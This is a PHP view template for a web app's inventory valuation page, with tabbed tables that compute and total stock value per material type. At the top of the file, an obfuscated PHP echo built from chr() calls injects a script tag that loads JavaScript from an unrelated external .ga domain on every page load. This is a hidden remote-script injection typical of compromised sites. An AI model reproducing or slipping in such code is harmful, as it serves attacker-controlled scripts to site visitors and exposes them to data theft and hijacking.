<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
?>


<div class="x_content">
<div class=" col-md-12 export_div">
	<div class="col-md-4 ">
		       
		  <fieldset>
			<div class="control-group">
			  <div class="controls">
				<div class="input-prepend input-group">
				  <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
					<input type="text" style="width: 200px" name="EvaluationCurrentDate" id="EvaluationCurrentDate" class="form-control" value=""  data-table="inventory/inventory_valuation">
					 <!--<input type="text" style="width: 200px" name="EvaluationCurrentDate"  class="form-control" value=""  id="EvaluationCurrentDate" />-->
				 
				</div>
			  </div>
			</div>
		  </fieldset>              
    </div>
	<div class="col-md-4"></div>
	<div class="col-md-4 datePick-right"><button class = "btn btn-primary save" style="float:right;">Save</button></div>
</div>	
	<div class="" role="tabpanel" data-example-id="togglable-tabs" style="clear: both;">
		<ul id="myTab" class="nav nav-tabs bar_tabs" role="tablist">
			<li role="presentation" class="active"><a href="#inventory_valuation" id="inventory_valuation-tab" role="tab" data-toggle="tab" aria-expanded="true">Inventory valuation</a>
			</li>
			<li role="presentation" class=""><a href="#non_available" role="tab" id="non_available-tab" data-toggle="tab" aria-expanded="false">Non-Available Material </a>
			</li>
			
		</ul>
		<div id="myTabContent" class="tab-content">
			<!-------------------inventoryevaluation-------------------------------->
			<div role="tabpanel" class="tab-pane fade active in" id="inventory_valuation" aria-labelledby="inventory_valuation-tab">
			<p class="text-muted font-13 m-b-30"></p>                   
			<table  class="table table-striped table-bordered user_index " data-id="user" id = "datatable-buttons_wrapper">
					   
			<!--<table id="datatable-buttons" class="table  table-bordered user_index" style="width:100%" data-id="user" border="1" cellpadding="3">
			<table id="datatable-buttons" class="table table-striped table-bordered user_index" data-id="user" border="1" cellpadding="3">-->
				<thead>
					<tr>	
						<th>Product Type</th>
						<th>Total</th>
						<th>Product Code</th>
						<th>Product</th>
						<th>Cost Price</th>
						<th>Sales Price</th>
						<th>Quantity</th>
						<th>Product Evaluation</th>	
					</tr>
				</thead>
				<!--<tbody id="evaluation_data">-->
				<tbody>
				<?php 
				if(!empty($inventory_valuation)){
					$i = 0;
					$grand_total =0;
					$valuationArray = array();
						$unique_material_type_id = array_unique(array_map(function($elem){return $elem['material_type_id'];}, $inventory_valuation));
						//pre($unique_material_type_id );
							foreach($unique_material_type_id as $mat_type_id){
								$costPrice  = 0;
								$sales_price  = 0;
								foreach($inventory_valuation as $inventoryData){
									//pre($inventoryData);
									if($mat_type_id == $inventoryData['material_type_id']){
										$CostPricePerItem = $inventoryData['cost_price'];
										$SalePricePerItem = $inventoryData['sales_price'];
										$QtyPerItem = $inventoryData['closing_balance'];
										$valuationPerItem = min($CostPricePerItem , $SalePricePerItem);   //calculate min value form cP/sp 
										$totalAmount = $valuationPerItem * $QtyPerItem; 					//multiple the min value with qty
										//pre($totalAmount);
										$valuationArray[$i]['material_id'][] = $inventoryData['id'];							
										$valuationArray[$i]['material_type_id'] = $mat_type_id;							
										$valuationArray[$i]['material_code'][] = $inventoryData['material_code'];
										$valuationArray[$i]['material_name'][] = $inventoryData['material_name'];
										$valuationArray[$i]['sales'][] = $inventoryData['sales_price'];
										$valuationArray[$i]['cost_price'][] = $inventoryData['cost_price'];
										$valuationArray[$i]['total_evaluation'][] = $totalAmount;
										//$EvaluationArray[$i]['totalCost'] += $costPrice ;									
										//$EvaluationArray[$i]['TotalSales'][] = $sales_price * $closing_balance;													
										$valuationArray[$i]['closing_balance'][] = $inventoryData['closing_balance'];
										$valuationArray[$i]['uom'][] = $inventoryData['uom'];		
										//$EvaluationArray[$i][$inventoryData['material_type_id']]['cooco'][] += $costPrice;	
										//$EvaluationArray[$i]['cost_price'][] += $costPrice;
										//$EvaluationArray[$inventoryData['material_type_id']]['costPrice'] += $costPrice;					
									}								
									
								}
								$i++;
							}
							//pre($EvaluationArray);
							 $m = 0;
							foreach($valuationArray as $fetchValue){
								$materialId = $fetchValue['material_id'];
								
								$materialType = getNameById('material_type',$fetchValue['material_type_id'],'id');
								
								$materialname = $fetchValue['material_name'];
								$CostPrice = $fetchValue['cost_price'];
								$SalePrice = $fetchValue['sales'];
								$matCode = $fetchValue['material_code'];
								//$qty = $fetchValue['closing_balance'];
								$uom = $fetchValue['uom'];
								$valuationPerMaterial = $fetchValue['total_evaluation'];
								
								
								$TotalvaluationCost= 0;
								
								foreach($valuationPerMaterial as $valuation_Per_Material){
									$TotalvaluationCost += $valuation_Per_Material;
									
								}
								$grand_total +=$TotalvaluationCost;
								
								$countMat = count($materialId);
								//if(getClosingBalance($materialId[$m],date('Y-m-d h:i:s')) != 0){
								?>
								
								<tr>
									<td rowspan="<?php echo $countMat; ?>"><?php if(!empty($materialType)){echo $materialType->name;} ?></td>
									<td rowspan="<?php echo $countMat; ?>"><?php echo number_format($TotalvaluationCost);?></td>	
								<?php for ($i = 0; $i < $countMat; $i++){ ?>
									<td><?php echo $matCode[$i];?></td>
									<td><a href="javascript:void(0)" id="<?php echo $materialId[$i]; ?>" data-id="material_view" class="inventory_tabs"><?php echo $materialname[$i]; ?></a></td>
									
									<td contenteditable = 'true' class="only-numbers cp" id="<?php echo $materialId[$i]; ?>"><?php echo $CostPrice[$i];?></td>
									<td contenteditable = 'true' class="only-numbers sp" id="<?php echo $materialId[$i]; ?>" ><?php echo $SalePrice[$i];?></td>
									<td><?php echo getClosingBalance($materialId[$i],date('y-m-d'));//echo $qty[$i];?></td>
									<td><?php echo $valuationPerMaterial[$i];?></td>
									
								
								</tr>
							<?php  
											
									}
								//}
						}
						$m++;
						}
						?>
						<tr style="background-color:#DBFFD4;">
							<td colspan="5" style="font-size:30px;">Grand total</td>
							<td colspan="3" style="font-size:30px;"><?php if(!empty($grand_total)){echo "<b>".number_format($grand_total)."</b>"; }?></td>
						</tr>
						
						
					
				</tbody>   
			     
			</table>
			    
			</div>
			<!-------------------end of tab-------------------------------------------->
			<!----------------------start of secodn tab---------------------------------------------->
			<div role="tabpanel" class="tab-pane fade" id="non_available" aria-labelledby="non_available-tab">
			<p class="text-muted font-13 m-b-30"></p>                   
			<table  class="table table-striped table-bordered user_index " data-id="user" id = "datatable-buttons_wrapper">
			<!--<table id="datatable-buttons" class="table  table-bordered user_index" style="width:100%" data-id="user" border="1" cellpadding="3">
			<table id="datatable-buttons" class="table table-striped table-bordered user_index" data-id="user" border="1" cellpadding="3">-->
				<thead>
					<tr>	
						<th>Type of Material</th>
						<th>Total</th>
						<th>Material Code</th>
						<th>Material</th>
						<th>Cost Price</th>
						<th>Sales Price</th>
						<th>Quantity</th>
						<th>Material Evaluation</th>	
					</tr>
				</thead>
				<!--<tbody id="evaluation_data">-->
				<tbody>
				<?php 
				if(!empty($valuationwith_zero)){
					$j = 0;
					$grandTotal =0;
					$valuation_zero_Array = array();
						$uniqueMaterial_type_id = array_unique(array_map(function($elem){return $elem['material_type_id'];}, $valuationwith_zero));
						//pre($unique_material_type_id );
							foreach($uniqueMaterial_type_id as $matType_id){
								$costPrice  = 0;
								$sales_price  = 0;
								foreach($valuationwith_zero as $inventory_Data){
									//pre($inventoryData);
									if($matType_id == $inventory_Data['material_type_id']){
										$Cost_Price_PerItem = $inventory_Data['cost_price'];
										$Sale_Price_PerItem = $inventory_Data['sales_price'];
										$Qty_Per_Item = $inventory_Data['closing_balance'];
										$valuation_Per_Item = min($Cost_Price_PerItem , $Sale_Price_PerItem);   //calculate min value form cP/sp 
										$total_Amount = $valuation_Per_Item * $Qty_Per_Item; 					//multiple the min value with qty
										//pre($totalAmount);
										$valuation_zero_Array[$j]['material_id'][] = $inventory_Data['id'];							
										$valuation_zero_Array[$j]['material_type_id'] = $matType_id;							
										$valuation_zero_Array[$j]['material_code'][] = $inventory_Data['material_code'];
										$valuation_zero_Array[$j]['material_name'][] = $inventory_Data['material_name'];
										$valuation_zero_Array[$j]['sales'][] = $inventory_Data['sales_price'];
										$valuation_zero_Array[$j]['cost_price'][] = $inventory_Data['cost_price'];
										$valuation_zero_Array[$j]['total_evaluation'][] = $total_Amount;
										//$EvaluationArray[$i]['totalCost'] += $costPrice ;									
										//$EvaluationArray[$i]['TotalSales'][] = $sales_price * $closing_balance;													
										$valuation_zero_Array[$j]['closing_balance'][] = $inventory_Data['closing_balance'];
										$valuation_zero_Array[$j]['uom'][] = $inventory_Data['uom'];		
										//$EvaluationArray[$i][$inventoryData['material_type_id']]['cooco'][] += $costPrice;	
										//$EvaluationArray[$i]['cost_price'][] += $costPrice;
										//$EvaluationArray[$inventoryData['material_type_id']]['costPrice'] += $costPrice;					
									}								
									
								}
								$j++;
							}
							//pre($EvaluationArray);
							
							foreach($valuation_zero_Array as $fetch_Value){
								$materialId = $fetch_Value['material_id'];
								$materialType = getNameById('material_type',$fetch_Value['material_type_id'],'id');
								
								$materialname = $fetch_Value['material_name'];
								$CostPrice = $fetch_Value['cost_price'];
								$SalePrice = $fetch_Value['sales'];
								$matCode = $fetch_Value['material_code'];
								$qty = $fetch_Value['closing_balance'];
								$uom = $fetch_Value['uom'];
								$valuation_Per_Material = $fetch_Value['total_evaluation'];
								
								//pre($Evaluation_Per_Material);
								$Total_valuationCost= 0;
								
								foreach($valuation_Per_Material as $valuationOfMaterial){
									$Total_valuationCost += $valuationOfMaterial;
									
								}
								$grandTotal +=$Total_valuationCost;
								
								$count_Mat = count($materialId);
								?>
								
								<tr>
									<td rowspan="<?php echo $count_Mat; ?>"><?php echo $materialType->name; ?></td>
									<td rowspan="<?php echo $count_Mat; ?>"><?php echo number_format($Total_valuationCost);?></td>	
								<?php for ($k = 0; $k < $count_Mat; $k++){ ?>
									<td><?php echo $matCode[$k];?></td>
									<td><a href="javascript:void(0)" id="<?php echo $materialId[$k]; ?>" data-id="material_view" class="inventory_tabs"><?php echo $materialname[$k]; ?></a></td>
									
									<td contenteditable = 'true' class="only-numbers cp" id="<?php echo $materialId[$k]; ?>"><?php echo $CostPrice[$k];?></td>
									<td contenteditable = 'true' class="only-numbers sp" id="<?php echo $materialId[$k]; ?>" ><?php echo $SalePrice[$k];?></td>
									<td><?php echo getClosingBalance($materialId[$k],date('y-m-d'));//echo $qty[$k];?></td>
									<td><?php echo $valuation_Per_Material[$k];?></td>
									
								
								</tr>
							<?php  							
							}
						}
						}
						?>
						<tr style="background-color:#DBFFD4;">
							<td colspan="5" style="font-size:30px;">Grand total</td>
							<td colspan="3" style="font-size:30px;"><?php if(!empty($grandTotal)){echo "<b>".number_format($grandTotal)."</b>"; }else{ echo "0";}?></td>
						</tr>
						
						
					
				</tbody>   
				<!---<tr><button class = "btn btn-success save2" style="float:right;">Save</button> <tr> --> 	                
			</table>
			</div>
			<!--------------------------end of tab------------------------------------------------>
		</div>
	</div>
</div>
<?php $this->load->view('common_modal'); ?>	

 

			